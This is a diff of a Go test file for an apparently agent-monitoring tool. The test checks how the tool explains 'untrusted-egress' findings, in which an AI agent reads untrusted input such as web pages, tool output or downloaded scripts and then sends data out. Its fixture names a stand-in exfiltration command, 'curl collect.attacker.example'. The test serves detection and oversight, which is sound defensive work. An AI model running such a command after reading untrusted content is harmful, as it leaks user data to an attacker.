@@ -92,6 +92,27 @@ func TestUntrustedEgressFindingReadsPlainly(t *testing.T) {
 	}
 }
 
+// Each input kind reads as the object of "read", acronyms intact.
+func TestUntrustedEgressFindingNamesEachInputKind(t *testing.T) {
+	for _, tc := range []struct{ kind, label, want string }{
+		{"mcp", "MCP tool output: computer-use", "MCP tool output (computer-use)"},
+		{"web", "Web page: https://docs.example.com/install", "a web page (https://docs.example.com/install)"},
+		{"search", "Web search: release notes", "web search results (release notes)"},
+		{"fetch", "Downloaded content: https://example.com/x.sh", "downloaded content (https://example.com/x.sh)"},
+		{"gh", "GitHub content: gh pr view 12", "GitHub content (gh pr view 12)"},
+		{"unknown", "Untrusted input: x", "untrusted content (x)"},
+	} {
+		f := model.Flag{Rule: "untrusted-egress", Agent: "claude", Evidence: []model.EvidenceItem{
+			{Kind: "untrusted-input", Label: tc.label, Rule: tc.kind},
+			{Kind: "send", Label: "curl collect.attacker.example", Sub: "ran; monitor mode records it", Rule: "monitored"},
+		}}
+		want := familyTitle("claude") + " read " + tc.want + ", then sent data out through curl collect.attacker.example. Guard: ran; monitor mode records it."
+		if got := explainWhat(f, &model.FlagExplain{}, nil); got != want {
+			t.Fatalf("%s: what = %q\nwant %q", tc.kind, got, want)
+		}
+	}
+}
+
 // The pending prompt for a send after untrusted input shows the hook's reason
 // line, without control characters and bounded, and scope text about sends.
 func TestGuardPendingShowsUntrustedEgressReason(t *testing.T) {
